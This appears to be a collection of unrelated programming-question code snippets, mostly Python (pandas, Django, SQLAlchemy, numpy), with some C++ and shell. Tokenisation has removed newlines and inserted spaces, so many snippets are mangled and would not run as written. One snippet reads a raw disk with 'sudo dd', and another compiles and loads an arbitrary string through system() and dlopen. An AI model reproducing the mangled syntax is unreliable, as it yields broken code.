"guestlist_table = Table ( 'guestlist ' , Base.metadata , Column ( 'event_id ' , Integer , ForeignKey ( 'events.id ' ) ) , Column ( 'user_id ' , Integer , ForeignKey ( 'users.id ' ) ) ) class Event ( Base ) : __tablename__ = 'events ' id = Column ( Integer , primary_key=True ) name = Column ( String ( 80 ) , nullable=False ) started = Column ( DateTime , nullable=False , index=True , default=datetime.datetime.now ) users = relationship ( `` User '' , secondary=guestlist_table , backref= '' events '' ) # ... class User ( Base ) : __tablename__ = 'users ' id = Column ( Integer , primary_key=True ) name = Column ( String ( 50 ) , nullable=False , unique=True , index=True ) birthdate = Column ( Date , nullable=False ) weight = Column ( Integer , nullable=False ) sex = Column ( Boolean , nullable=False ) # ... class Drink ( Base ) : __tablename__ = 'drinks ' id = Column ( Integer , primary_key=True ) name = Column ( String ( 50 ) , nullable=False ) volume = Column ( Numeric ( 5,2 ) , nullable=False ) percent = Column ( Numeric ( 5,2 ) , nullable=False ) # ... class Shots ( Base ) : __tablename__ = 'shots ' id = Column ( Integer , primary_key=True ) at = Column ( DateTime , nullable=False , default=datetime.datetime.now ) user_id = Column ( Integer , ForeignKey ( 'users.id ' ) , index=True ) event_id = Column ( Integer , ForeignKey ( 'events.id ' ) , index=True ) drink_id = Column ( Integer , ForeignKey ( 'drinks.id ' ) ) user = relationship ( `` User '' , backref= '' shots '' ) event = relationship ( `` Event '' , backref= '' shots '' ) drink = relationship ( `` Drink '' , uselist=False ) # one-to-one , no backref needed"
"< div class= '' panel panel-default '' > { % for comment in spot.ordered_comments % } < div class= '' panel-heading row '' > < div class= '' col-sm-10 '' > < strong > { { comment.poster.username } } < /strong > < em style= '' margin-left : 2em '' > { { comment.created|date : 'M d \ ' y \a\t H : i ' } } < /em > < /div > < div class= '' btn-group col-sm-2 '' role= '' group '' > { % if comment.poster == user % } < form id= '' delete-comment-form '' class= '' form '' method= '' post '' action= '' { % url 'delete_comment ' spot.id comment.id % } '' > { % csrf_token % } < /form > { % include 'topspots/editmodal.html ' with edit_type='comment ' % } < div class= '' btn-group '' > < button type= '' button '' class= '' btn btn-default dropdown-toggle '' data-toggle= '' dropdown '' aria-haspopup= '' true '' aria-expanded= '' false '' > < i class= '' fa fa-edit '' > < /i > < span class= '' caret '' > < /span > < /button > < ul class= '' dropdown-menu '' > < li > < a href= '' # '' data-toggle= '' modal '' data-target= '' # editModal '' > Edit < /a > < /li > < li role= '' separator '' class= '' divider '' > < /li > < li > < a href= '' javascript : ; '' onclick= '' $ ( ' # delete-comment-form ' ) .submit ( ) ; '' > Delete < /a > < /li > < /ul > < /div > { % endif % } { % if user.is_authenticated % } { % include 'topspots/replymodal.html ' % } < button type= '' button '' class= '' btn btn-default '' data-toggle= '' modal '' data-target= '' # replyModal '' > Reply < /button > { % endif % } < /div > < /div > < div class= '' panel-body '' > < div class = '' row '' > < div class= '' col-sm-8 '' > { { comment.comment_text } } < /div > < /div > < br/ > < ! -- Comment replies -- > { % if comment.commentreply_set % } { % for reply in comment.commentreply_set.all % } < div class= '' row '' style= '' padding-left : 1em '' > < div class= '' col-sm-8 well '' > < p > { { reply.reply_text } } < /p > < div class= '' row '' > < div class= '' col-sm-4 '' > < p > < strong > { { reply.poster.username } } < /strong > < em style= '' margin-left : 2em '' > { { comment.created|date : 'M d \ ' y \a\t H : i ' } } < /em > < /p > < /div > { % if reply.poster == user % } { % include 'topspots/editmodal.html ' with edit_type='reply ' % } < form id= '' delete-reply-form '' class= '' form '' method= '' post '' action= '' { % url 'delete_reply ' spot.id reply.id % } '' > { % csrf_token % } < /form > < div class= '' col-sm-2 '' > < div class= '' btn-group '' > < button type= '' button '' class= '' btn btn-default dropdown-toggle '' data-toggle= '' dropdown '' aria-haspopup= '' true '' aria-expanded= '' false '' > < i class= '' fa fa-edit '' > < /i > < span class= '' caret '' > < /span > < /button > < ul class= '' dropdown-menu '' > < li > < a href= '' # '' data-toggle= '' modal '' data-target= '' # editModal '' > Edit < /a > < /li > < li role= '' separator '' class= '' divider '' > < /li > < li > < a href= '' javascript : ; '' onclick= '' $ ( ' # delete-reply-form ' ) .submit ( ) ; '' > Delete < /a > < /li > < /ul > < /div > < /div > { % endif % } < /div > < /div > < /div > { % endfor % } { % endif % } < /div > { % endfor % } < /div > < ! -- editmodal.html -- > { % load static % } < div class= '' modal fade '' id= '' editModal '' tabindex= '' -1 '' role= '' dialog '' aria-labelledby= '' editModalLabel '' > < div class= '' modal-dialog '' role= '' document '' > < div class= '' modal-content '' > < div class= '' modal-header '' > < button type= '' button '' class= '' close '' data-dismiss= '' modal '' aria-label= '' Close '' > < span aria-hidden= '' true '' > & times ; < /span > < /button > < h2 class= '' modal-title '' id= '' editModalLabel '' > Edit { { edit_type } } : < /h2 > < /div > < form action= '' { % url 'edit_comment ' spot.id comment.id % } '' method= '' post '' > < div class= '' modal-body '' > < input class= '' form-control '' name= '' text '' value= '' { { comment.comment_text } } '' autofocus > < input type= '' hidden '' name= '' edit_type '' value= '' { { edit_type } } '' > { % csrf_token % } < /div > < div class= '' modal-footer '' > < button type= '' submit '' class= '' btn btn-default '' > Finish editing < /button > < /div > < /form > < /div > < /div > < /div > < script > $ ( '.modal ' ) .on ( 'shown.bs.modal ' , function ( ) { $ ( this ) .find ( ' [ autofocus ] ' ) .focus ( ) ; } ) ; < /script > < ! -- replymodal.html -- > { % load static % } < div class= '' modal fade '' id= '' replyModal '' tabindex= '' -1 '' role= '' dialog '' aria-labelledby= '' replyModalLabel '' > < div class= '' modal-dialog '' role= '' document '' > < div class= '' modal-content '' > < div class= '' modal-header '' > < button type= '' button '' class= '' close '' data-dismiss= '' modal '' aria-label= '' Close '' > < span aria-hidden= '' true '' > & times ; < /span > < /button > < h2 class= '' modal-title '' id= '' replyModaLabel '' > Reply to < strong > { { comment.poster.username } } 's < /strong > comment < /h2 > < /div > < div class= '' modal-body '' > < form action= '' { % url 'reply_comment ' spot.id comment.id % } '' method= '' post '' > < input class= '' form-control '' name= '' reply_text '' placeholder= '' Write a reply ... '' autofocus > { % csrf_token % } < /form > < /div > < /div > < /div > < /div > < script > $ ( '.modal ' ) .on ( 'shown.bs.modal ' , function ( ) { $ ( this ) .find ( ' [ autofocus ] ' ) .focus ( ) ; } ) ; < /script > def test ( request ) : spots = Spot.objects.all ( ) return render ( request , 'test.html ' , { 'spots ' : spots } ) < ! -- test.html -- > < h1 > Hello world < /h1 > { % for spot in spots % } { % include 'testinclude.html ' % } { % endfor % } < ! -- testinclude.html -- > < h3 > { { spot.name } } < /h3 >"
import structs = struct.Struct ( ' Q ' ) ; print s.sizes = struct.Struct ( ' H L Q ' ) ; print s.sizes = struct.Struct ( ' H I Q ' ) ; print s.sizes = struct.Struct ( ' H I Q H ' ) ; print s.size 8241618
"_countries = { 'Africa ' : [ 'Ghana ' , 'Togo ' , 'South Africa ' ] , 'Asia ' : [ 'China ' , 'Thailand ' , 'Japan ' ] , 'Europe ' : [ 'Austria ' , 'Bulgaria ' , 'Greece ' ] } continent = pn.widgets.Select ( value='Asia ' , options= [ 'Africa ' , 'Asia ' , 'Europe ' ] ) country = pn.widgets.Select ( value=_countries [ continent.value ] [ 0 ] , options=_countries [ continent.value ] ) @ pn.depends ( continent.param.value ) def _update_countries ( continent ) : countries = _countries [ continent ] country.options = countries country.value = countries [ 0 ] pn.Row ( continent , country )"
In [ 8 ] : cProfile.run ( 'sum ( ( number for number in xrange ( 9999999 ) if number % 2 == 0 ) ) ' ) 5000004 function calls in 1.111 seconds Ordered by : standard name ncalls tottime percall cumtime percall filename : lineno ( function ) 5000001 0.760 0.000 0.760 0.000 < string > :1 ( < genexpr > ) 1 0.000 0.000 1.111 1.111 < string > :1 ( < module > ) 1 0.000 0.000 0.000 0.000 { method 'disable ' of '_lsprof.Profiler ' objects } 1 0.351 0.351 1.111 1.111 { sum } In [ 9 ] : cProfile.run ( 'sum ( [ number for number in xrange ( 9999999 ) if number % 2 == 0 ] ) ' ) 3 function calls in 1.123 seconds Ordered by : standard name ncalls tottime percall cumtime percall filename : lineno ( function ) 1 1.075 1.075 1.123 1.123 < string > :1 ( < module > ) 1 0.000 0.000 0.000 0.000 { method 'disable ' of '_lsprof.Profiler ' objects } 1 0.048 0.048 0.048 0.048 { sum }
"from weakref import WeakKeyDictionaryclass Grade ( object ) : def __init__ ( self ) : self._values = WeakKeyDictionary ( ) def __get__ ( self , instance , instance_type ) : if instance is None : return self return self._values.get ( instance , 0 ) def __set__ ( self , instance , value ) : if not ( 0 < = value < = 100 ) : raise ValueError ( 'Grade must be between 0 and 100 ' ) self._values [ instance ] = value # Example 16class Exam ( object ) : math_grade = Grade ( ) writing_grade = Grade ( ) science_grade = Grade ( ) first_exam = Exam ( ) first_exam.writing_grade = 82second_exam = Exam ( ) second_exam.writing_grade = 75print ( 'First ' , first_exam.writing_grade , 'is right ' ) print ( 'Second ' , second_exam.writing_grade , 'is right ' )"
"myDict [ ( ' A ' , ' B ' ) ] = 'something'myDict [ ( ' B ' , ' A ' ) ] = 'something else'print ( myDict [ ( ' A ' , ' B ' ) ] )"
"import numpy as npimport sklearn.linear_modeldef plot_best_fit ( image_array , vertexX , vertexY ) : weights = np.array ( image_array ) x = np.where ( weights > 0 ) [ 1 ] y = np.where ( weights > 0 ) [ 0 ] size = len ( image_array ) * len ( image_array [ 0 ] ) y = np.zeros ( ( len ( image_array ) , len ( image_array [ 0 ] ) ) ) for i in range ( len ( np.where ( weights > 0 ) [ 0 ] ) ) : y [ np.where ( weights > 0 ) [ 0 ] [ i ] ] [ np.where ( weights > 0 ) [ 1 ] [ i ] ] = np.where ( weights > 0 ) [ 0 ] [ i ] y = y.reshape ( size ) x = np.array ( range ( len ( image_array ) ) * len ( image_array [ 0 ] ) ) weights = weights.reshape ( ( size ) ) for i in range ( len ( x ) ) : x [ i ] -= vertexX y [ i ] -= vertexY model = sklearn.linear_model.LinearRegression ( fit_intercept=False ) model.fit ( x.reshape ( ( -1 , 1 ) ) , y , sample_weight=weights ) line_x = np.linspace ( 0 , 512 , 100 ) .reshape ( ( -1,1 ) ) pred = model.predict ( line_x ) m , b = np.polyfit ( np.linspace ( 0 , 512 , 100 ) , np.array ( pred ) , 1 ) angle = math.atan ( m ) * 180/math.pi return line_x , pred , angle , b , m"
"import rematch = re.match ( r '' ^ ( \w+ ) : ( \s+ ( \w+ ) ) * '' , `` des1 : op1 op2 '' ) The groups from above code isGroup 0 : des1 : op1 op2Group 1 : des1Group 2 : op2Group 3 : op2"
def foo ( a ) : return ( ( a+1 ) *2 ) **4 ; def foo ( a : numeric ) : return ( ( a+1 ) *2 ) **4 ; from typing import Collection ; def foo ( _in : Collection [ numeric ] ) : return ( ( _in [ 0 ] +_in [ 1 ] ) *2 ) **4 ;
"P [ 'x_coords ' ] = [ 299398.56 299402.16 299410.25 299419.7 299434.97 299443.75 299454.1 299465.3 299477 . 299488.25 299496.8 299499.5 299501.28 299504 . 299511.62 299520.62 299527.8 299530.06 299530.06 299525.12 299520.2 299513.88 299508.5 299500.84 299487.34 299474.78 299458.6 299444.66 299429.8 299415.4 299404.84 299399.47 299398.56 299398.56 ] P [ 'y_coords ' ] = [ 822975.2 822989.56 823001.25 823005.3 823006.7 823005.06 823001.06 822993.4 822977.2 822961 . 822943.94 822933.6 822925.06 822919.7 822916.94 822912.94 822906.6 822897.6 822886.8 822869.75 822860.75 822855.8 822855.4 822857.2 822863.44 822866.6 822870.6 822876.94 822886.8 822903 . 822920.3 822937.44 822954.94 822975.2 ] Q [ 'x_coords ' ] = [ 292316.94 292317.94 292319.44 292322.47 292327.47 292337.72 292345.75 292350 . 292352.75 292353.5 292352.25 292348.75 292345.75 292342.5 292338.97 292335.97 292333.22 292331.22 292329.72 292324.72 292319.44 292317.2 292316.2 292316.94 ] Q [ 'y_coords ' ] = [ 663781 . 663788.25 663794 . 663798.06 663800.06 663799.3 663796.56 663792.75 663788.5 663782 . 663773.25 663766 . 663762 . 663758.25 663756.5 663756.25 663757.5 663761 . 663763.75 663767.5 663769.5 663772.25 663777.5 663781 . ] # # SIMPLIFIED AND FORMATTED FOR EASY TESTING : import numpy as nppx_coords = np.array ( [ 299398,299402,299410.25,299419.7,299398 ] ) py_coords = np.array ( [ 822975.2,822920.3,822937.44,822954.94,822975.2 ] ) qx_coords = np.array ( [ 292316,292331.22,292329.72,292324.72,292319.44,292317.2,292316 ] ) qy_coords = np.array ( [ 663781,663788.25,663794,663798.06,663800.06,663799.3,663781 ] )"
apt-get install python-sphinx apt-get install sphinxsearch mkdir rest cd rest/ sphinx-quickstart
"import unittestfrom pymongo import Connectionfrom tractor import Tractorclass TestTractor ( unittest.TestCase ) : def setUp ( self ) : self.tractor = Tractor ( 1 ) self.mongo = Connection ( ) self.db = self.mongo.tractor self.db.classes.remove ( { 'name ' : { ' $ regex ' : '^test_ ' } } ) self.action_class_id = self.db.classes.insert ( { 'name ' : 'test_action ' , 'metaclass ' : 'action ' } ) self.object_class_id = self.db.classes.insert ( { 'name ' : 'test_object ' , 'metaclass ' : 'object ' } ) def tearDown ( self ) : self.tractor = None def test_create_class ( self ) : cid1 = self.tractor.create_action_class ( 'test_create_action_class ' ) cid2 = self.tractor.create_object_class ( 'test_create_object_class ' ) self.assertNotEqual ( cid1 , None ) self.assertNotEqual ( cid2 , None ) action_obj = self.db.classes.find_one ( { '_id ' : cid1 } ) object_obj = self.db.classes.find_one ( { '_id ' : cid2 } ) self.assertNotEqual ( cid1 , cid2 ) self.assertEqual ( action_obj [ '_id ' ] , cid1 ) self.assertEqual ( object_obj [ '_id ' ] , cid2 ) self.assertEqual ( action_obj [ 'name ' ] , 'test_create_action_class ' ) self.assertEqual ( object_obj [ 'name ' ] , 'test_create_object_class ' ) from pymongo import Connectionfrom pymongo.objectid import ObjectIdclass Tractor ( object ) : def __init__ ( self , uid ) : self.uid = uid self.mongo = Connection ( ) self.db = self.mongo.tractor # Classes def create_action_class ( self , name ) : return self.db.classes.insert ( { 'name ' : name , 'attributes ' : [ ] , 'metaclass ' : 'action ' } ) def create_object_class ( self , name ) : return self.db.classes.insert ( { 'name ' : name , 'attributes ' : [ ] , 'metaclass ' : 'object ' } ) silver @ aregh-6930-lnx ~/projects/traction/tractor $ python -m unittest discover ... ... ssEssssssssss======================================================================ERROR : test_create_class ( tests.test_tractor.TestTractor ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` /home/silver/projects/traction/tractor/tests/test_tractor.py '' , line 64 , in test_create_class self.assertEqual ( action_obj [ '_id ' ] , cid1 ) TypeError : 'NoneType ' object is not subscriptable -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 19 tests in 0.023sFAILED ( errors=1 , skipped=12 ) silver @ aregh-6930-lnx ~/projects/traction/tractor $ python -m unittest discover ... ... ss.ssssssssss -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Ran 19 tests in 0.015sOK ( skipped=12 )"
"class Quad { public : Quad ( int , int ) ; double integrate ( boost : :function < double ( std : :vector < double > const & ) > const & ) ; double integrate_wrapper ( boost : :python : :object const & ) ; std : :vector < std : :vector < double > > nodes ; std : :vector < double > weights ; } ; ... namespace std { typedef std : :vector < std : :vector < std : :vector < double > > > cube ; typedef std : :vector < std : :vector < double > > mat ; typedef std : :vector < double > vec ; } ... double Quad : :integrate ( boost : :function < double ( vec const & ) > const & func ) { double result = 0. ; for ( unsigned int i = 0 ; i < nodes.size ( ) ; ++i ) { result += func ( nodes [ i ] ) * weights [ i ] ; } return result ; } // -- -- PYTHON WRAPPER -- -- double Quad : :integrate_wrapper ( boost : :python : :object const & func ) { std : :function < double ( vec const & ) > lambda ; switch ( this- > nodes [ 0 ] .size ( ) ) { case 1 : lambda = [ & func ] ( vec const & v ) - > double { return boost : :python : :extract < double > ( func ( v [ 0 ] ) ) ; } ; break ; case 2 : lambda = [ & func ] ( vec const & v ) - > double { return boost : :python : :extract < double > ( func ( v [ 0 ] , v [ 1 ] ) ) ; } ; break ; case 3 : lambda = [ & func ] ( vec const & v ) - > double { return boost : :python : :extract < double > ( func ( v [ 0 ] , v [ 1 ] , v [ 2 ] ) ) ; } ; break ; default : cout < < `` Dimension must be 1 , 2 , or 3 '' < < endl ; exit ( 0 ) ; } return integrate ( lambda ) ; } // -- -- EXPOSE TO PYTHON -- -- BOOST_PYTHON_MODULE ( hermite ) { using namespace boost : :python ; class_ < std : :vec > ( `` double_vector '' ) .def ( vector_indexing_suite < std : :vec > ( ) ) ; class_ < std : :mat > ( `` double_mat '' ) .def ( vector_indexing_suite < std : :mat > ( ) ) ; class_ < Quad > ( `` Quad '' , init < int , int > ( ) ) .def ( `` integrate '' , & Quad : :integrate_wrapper ) .def_readonly ( `` nodes '' , & Quad : :nodes ) .def_readonly ( `` weights '' , & Quad : :weights ) ; } double func ( vector < double > v ) { return F1_OR_F2 ; } int main ( ) { hermite : :Quad quadrature ( 100 , 3 ) ; double result = quadrature.integrate ( func ) ; cout < < `` Result = `` < < result < < endl ; } import hermitedef function ( x , y , z ) : return F1_OR_F2my_quad = hermite.Quad ( 100 , 3 ) result = my_quad.integrate ( function ) import hermitedef function ( x , y , z ) : return F1_OR_F2my_quad = hermite.Quad ( 100 , 3 ) weights = my_quad.weightsnodes = my_quad.nodesresult = 0.for i in range ( len ( weights ) ) : result += weights [ i ] * function ( nodes [ i ] [ 0 ] , nodes [ i ] [ 1 ] , nodes [ i ] [ 2 ] ) double Quad : :integrate_from_string ( string const & function_body ) { // Write function to file ofstream helper_file ; helper_file.open ( `` /tmp/helper_function.cpp '' ) ; helper_file < < `` # include < vector > \n # include < cmath > \n '' ; helper_file < < `` extern \ '' C\ '' double toIntegrate ( std : :vector < double > v ) { \n '' ; helper_file < < `` return `` < < function_body < < `` ; \n } '' ; helper_file.close ( ) ; // Compile file system ( `` c++ /tmp/helper_function.cpp -o /tmp/helper_function.so -shared -fPIC '' ) ; // Load function dynamically typedef double ( *vec_func ) ( vec ) ; void *function_so = dlopen ( `` /tmp/helper_function.so '' , RTLD_NOW ) ; vec_func func = ( vec_func ) dlsym ( function_so , `` toIntegrate '' ) ; double result = integrate ( func ) ; dlclose ( function_so ) ; return result ; } import numpy as npimport numpy.polynomial.hermite_e as hermimport timedef integrate ( function , degrees ) : dim = len ( degrees ) nodes_multidim = [ ] weights_multidim = [ ] for i in range ( dim ) : nodes_1d , weights_1d = herm.hermegauss ( degrees [ i ] ) nodes_multidim.append ( nodes_1d ) weights_multidim.append ( weights_1d ) grid_nodes = np.meshgrid ( *nodes_multidim ) grid_weights = np.meshgrid ( *weights_multidim ) nodes_flattened = [ ] weights_flattened = [ ] for i in range ( dim ) : nodes_flattened.append ( grid_nodes [ i ] .flatten ( ) ) weights_flattened.append ( grid_weights [ i ] .flatten ( ) ) nodes = np.vstack ( nodes_flattened ) weights = np.prod ( np.vstack ( weights_flattened ) , axis=0 ) return np.dot ( function ( nodes ) , weights ) def function ( v ) : return F1_OR_F2result = integrate ( function , [ 100,100,100 ] ) print ( `` - > Result = `` + str ( result ) + `` , Time = `` + str ( end-start ) )"
"from operator import itemgetterfrom itertools import product # Cartesian product function from the std libdef optimize ( sets ) : `` '' '' Return the largest ( total-weight , combination ) tuple from all possible combinations of the elements in the several sets , subject to the constraint that is_feasible ( combo ) returns True . '' '' '' return max ( map ( lambda combination : ( sum ( element.weight for element in combination ) , combination ) , filter ( is_feasible , # Returns True if combo meets constraint product ( *sets ) ) ) , key=itemgetter ( 0 ) # Only maximize based on sum of weight ) + -- -- -- -- -- -+ in_q0 | worker0 | -- -- \ / -- -- -- -+ -- -- -- -- -- -+ \+ -- -- -- -- -- -+ in_q1 + -- -- -- -- -- -+ \ out_q + -- -- -- -- -- -+| main | -- -- -- -- -- -| worker1 | -- -- -- -- -- -| main |+ -- -- -- -- -- -+ + -- -- -- -- -- -+ / + -- -- -- -- -- -+ \ -- -- -- -+ -- -- -- -- -- -+ / in_q2 | worker2 | -- -- / + -- -- -- -- -- -+ from itertools import cyclemain ( ) : # ( Create workers , each with its own input queue ) # Cycle through each worker 's queue and add a combination to that queue for combo , worker in zip ( product ( *sets ) , cycle ( workers ) ) : worker.in_q.put ( combo ) # ( Collect results and return )"
"from django.core.exceptions import ValidationErrorfrom django.core.validators import URLValidatordef validate_url ( value ) : url_validator = URLValidator ( ) url_invalid = False try : url_validator ( value ) except : url_invalid = True try : value = `` http : // '' +value url_validator ( value ) url_invalid = False except : url_invalid = True if url_invalid : raise ValidationError ( `` Invalid Data for this field '' ) return value from django import formsfrom .validators import validate_urlclass SubmitUrlForm ( forms.Form ) : url = forms.CharField ( label= '' Submit URL '' , validators= [ validate_url ] )"
"import pandas as pdimport numpy as npmy_data = np.array ( [ [ 0.5 , 0.2 , 0.1 ] , [ `` NA '' , 0.45 , 0.2 ] , [ 0.9 , 0.02 , `` N/A '' ] ] ) df = pd.DataFrame ( my_data , dtype=str ) df2 = df.convert_objects ( convert_numeric=True ) FutureWarning : convert_objects is deprecated . Use the data-type specific converters pd.to_datetime , pd.to_timedelta and pd.to_numeric . df3 = pd.to_numeric ( df , errors='force ' ) df2 : 0 1 20 0.5 0.20 0.11 NaN 0.45 0.22 0.9 0.02 NaNdf2 dtypes:0 float641 float642 float64dtype : objectdf3 : 0 1 20 0.5 0.2 0.11 NA 0.45 0.22 0.9 0.02 N/Adf3 dtypes:0 object1 object2 objectdtype : object"
"ERROR 2014-05-10 09:55:16,576 base.py:215 ] Internal Server Error : /api/billing/subscribe_to_paid_plan/stripe Traceback ( most recent call last ) : ... File `` /src/classes/billing/api_views.py '' , line 3 , in < module > import stripe File `` /src/stripe/__init__.py '' , line 16 , in < module > from stripe.resource import ( # noqa File `` /src/stripe/resource.py '' , line 5 , in < module > from stripe import api_requestor , error , util File `` /src/stripe/api_requestor.py '' , line 5 , in < module > import ssl File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/ssl.py '' , line 60 , in < module > import _ssl # if we ca n't import it , let the error propagate File `` /Applications/GoogleAppEngineLauncher.app/Contents/Resources/GoogleAppEngine-default.bundle/Contents/Resources/google_appengine/google/appengine/tools/devappserver2/python/sandbox.py '' , line 852 , in load_module raise ImportError ( 'No module named % s ' % fullname ) ImportError : No module named _ssl"
import gtkwindow = gtk.Window ( ) label = gtk.Label ( ) window.add ( label ) window.show_all ( ) for _ in range ( 100000 ) : label.set_markup ( 'Leaking memory ! ' ) while gtk.events_pending ( ) : gtk.main_iteration ( )
"from collections import defaultdictmeasurement_1=defaultdict ( None , [ ( `` component1 '' , [ 11.83 , 11.35 , 0.55 ] ) , ( `` component2 '' , [ 2.19 , 2.42 , 0.96 ] ) , ( `` component3 '' , [ 1.98 , 2.17 , 0.17 ] ) ] ) measurement_2=defaultdict ( None , [ ( `` component1 '' , [ 34940.57 , 35260.41 , 370.45 ] ) , ( `` component2 '' , [ 1360.67 , 1369.58 , 2.69 ] ) , ( `` component3 '' , [ 13355.60 , 14790.81 , 55.63 ] ) ] ) x_labels= [ '2016-12-01 ' , '2016-12-02 ' , '2016-12-03 ' ] from pygal import graphimport pygaldef draw ( measurement_1 , measurement_2 , x_labels ) : graph = pygal.Line ( ) graph.x_labels = x_labels for key , value in measurement_1.iteritems ( ) : graph.add ( key , value ) for key , value in measurement_2.iteritems ( ) : graph.add ( key , value , secondary=True ) return graph.render_data_uri ( )"
"import matplotlib.pyplotpyplot.plot ( [ 1,2,3 ] , [ 1,2,3 ] ) pyplot.show ( )"
< td > < font size= '' 2 '' color= '' # 00009c '' > < b > Consultant Registration Number : < /b > < /font > 16043646 < /td > < td > < font size= '' 2 '' color= '' # 00009c '' > < b > Consultant Registration Number : < /b > < /font > < /td >
"0 1 20 0.0 1.0 2.01 NaN 1.0 2.02 NaN NaN 2.0 Out [ 116 ] : 0 1 20 0.0 1.0 2.01 1.0 2.0 NaN2 2.0 NaN NaN df.apply ( lambda x : ( x [ x.notnull ( ) ] .values.tolist ( ) +x [ x.isnull ( ) ] .values.tolist ( ) ) ,1 ) Out [ 117 ] : 0 1 20 0.0 1.0 2.01 1.0 2.0 NaN2 2.0 NaN NaN df.shapeOut [ 117 ] : ( 54812040 , 1522 )"
"sudo dd if=/dev/sda of=~/file bs=8k count=200k ; rm -f ~/file output , err = subprocess.Popen ( [ 'sudo ' , 'dd ' , 'if=/dev/ ' + disk , 'of=~/disk_benchmark_file ' , 'bs=8k ' , 'count=200k ' ] , stderr=subprocess.PIPE ) .communicate ( ) print err"
"import requestsfrom M2Crypto import BIO , RSA , EVP , X509def verify_message ( cert_url , msg , sig ) : cert_text = requests.get ( cert_url , verify=True ) cert = X509.load_cert_string ( cert_text.content ) pubkey = cert.get_pubkey ( ) sig = sig.decode ( 'base64 ' ) # Write a few files to disk for debugging purposes f = open ( `` sig '' , `` wb '' ) f.write ( sig ) f.close ( ) f = open ( `` msg '' , `` w '' ) f.write ( msg ) f.close ( ) f = open ( `` mypubkey.pem '' , `` w '' ) f.write ( pubkey.get_rsa ( ) .as_pem ( ) ) f.close ( ) pubkey.reset_context ( md='sha1 ' ) pubkey.verify_init ( ) pubkey.verify_update ( msg ) assert pubkey.verify_final ( sig ) == 1 File `` /tmp/test.py '' , line 71 , in verify_message assert pubkey.verify_final ( sig ) == 1AssertionError [ jamie @ test5 tmp ] $ openssl dgst -sha1 -verify mypubkey.pem -signature sig msgVerified OK"
"docs_combinations = itertools.combinations ( docs_sample , 2 ) for doc1 , doc2 in docs_combinations : # scipy cosine similarity function includes normalising the vectors but is a distance .. so we need to take it from 1.0 doc_similarity_dict [ doc2 ] .update ( { doc1 : 1.0 - scipy.spatial.distance.cosine ( relevance_index [ doc1 ] , relevance_index [ doc2 ] ) } ) pass # convert dict to pandas dataframedoc_similarity_matrix = pandas.DataFrame ( doc_similarity_dict ) ... doc1 doc2 doc3wheel 2 . 3 . 0.seat 2 . 2 . 0.lights 0 . 1 . 1.cake 0 . 0 . 5 . ... doc2 doc3doc1 0.9449 0.doc2 - 0.052"
"image = Image.open ( `` image_file.jpg '' ) print ( image.format ) # Prints JPEGresized_image = image.resize ( [ 100,200 ] , PIL.Image.ANTIALIAS ) print ( resized_image.format ) # Prints None ! !"
"python -c 'import sys ; print `` a '' ' python -c 'for a in [ 1 , 2 , 3 ] : print a ' python -c 'import sys ; for a in [ 1 , 2 , 3 ] : print a ' File `` < string > '' , line 1 import sys ; for a in [ 1 , 2 , 3 ] : print a ^ python -c 'import sys ; print `` \n '' .join ( [ 1 , 2 , 3 ] ) '"
"def f ( ) : x = 0 while x < 21 : yield x x += 1g = f ( ) while True : x = [ i for _ , i in zip ( range ( 3 ) , g ) ] if not x : break print x"
"import pandas as pddf =pd.DataFrame ( { 'PatientID ' : [ 1 , 1 , 1 ] , 'Date ' : [ '01/01/2018 ' , '01/15/2018 ' , '01/20/2018 ' ] , 'Height ' : [ 'Null ' , '178 ' , 'Null ' ] , 'Weight ' : [ 'Null ' , '182 ' , '190 ' ] , 'O2 Level ' : [ '95 ' , '99 ' , '92 ' ] , 'BPS ' : [ '120 ' , 'Null ' , 'Null ' ] , 'DPS ' : [ '80 ' , 'Null ' , 'Null ' ] } ) df = pd.DataFrame ( { 'PatientID ' : [ 1 ] , 'Height ' : [ '178 ' ] , 'Weight ' : [ '190 ' ] , 'O2 Level ' : [ '92 ' ] , 'BPS ' : [ '120 ' ] , 'DPS ' : [ '80 ' ] } )"
"class ExistingModel ( models.Model ) : # ... model stuff created_at = models.DateTimeField ( auto_now_add=True ) updated_at = models.DateTimeField ( auto_now=True ) ( fields.E160 ) The options auto_now , auto_now_add , and default are mutually exclusive . Only one of these options may be present ."
"a = np.array ( [ 0.1 , 0.2 , 1.0 , 1.0 , 1.0 , 0.9 , 0.6 , 1.0 , 0.0 , 1.0 ] ) [ 0 , 0 , 1 , 2 , 3 , 3 , 3 , 4 , 0 , 1 ]"
"class ExplainedValue ( object ) : def __init__ ( self , value , reason ) : self.value = value self.reason = reason def __getattribute__ ( self , name ) : print '__getattribute__ with % s called ' % ( name , ) if name in ( '__str__ ' , '__repr__ ' , 'reason ' , 'value ' ) : return object.__getattribute__ ( self , name ) value = object.__getattribute__ ( self , 'value ' ) return object.__getattribute__ ( value , name ) def __str__ ( self ) : return `` ExplainedValue ( % s , % s ) '' % ( str ( self.value ) , self.reason ) __repr__ = __str__ > > > numbers = ExplainedValue ( [ 1 , 2 , 3 , 4 ] , `` it worked '' ) > > > numbers [ 0 ] Traceback ( most recent call last ) : File `` < pyshell # 118 > '' , line 1 , in < module > numbers [ 0 ] TypeError : 'ExplainedValue ' object does not support indexing > > > list ( numbers ) __getattribute__ with __class__ calledTraceback ( most recent call last ) : File `` < pyshell # 119 > '' , line 1 , in < module > list ( numbers ) TypeError : 'ExplainedValue ' object is not iterable > > > numbers.value [ 0 ] __getattribute__ with value called1 > > > list ( numbers.value ) __getattribute__ with value called [ 1 , 2 , 3 , 4 ]"
"import datetimeimport sysclass PS1 ( object ) : def __repr__ ( self ) : now = datetime.datetime.now ( ) return str ( now.strftime ( `` % H : % M : % S '' ) ) sys.ps1 = PS1 ( ) class Example ( object ) : def methodOne ( self , a , b ) : return a + b def methodTwo ( self , a , b ) : return a * bexample = Example ( ) example = class ( object ) : def methodOne ( self , a , b ) : return a + b def methodTwo ( self , a , b ) : return a * b"
"' 1 , 2 , , , 3 ' [ ' 1 ' , ' 2 ' , ' 3 ' ] print [ el.strip ( ) for el in mystring.split ( `` , '' ) if el.strip ( ) ]"
